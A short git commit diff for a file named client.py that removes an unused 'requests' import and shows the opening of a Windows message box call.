3045dc2b983f5df263e27f91dd92d82c4db73e52
k200-dev <85361508+k200-dev@users.noreply.github.com>
2021-06-12 18:58:58 +0100

    Removed unused import

--- client.py
+++ client.py
@@ -1,4 +1,4 @@
-import socket, subprocess, time, json, os, base64, requests, ctypes, os, sys
+import socket, subprocess, time, json, os, base64, ctypes, os, sys
 
 ctypes.windll.user32.MessageBoxW(
     0,
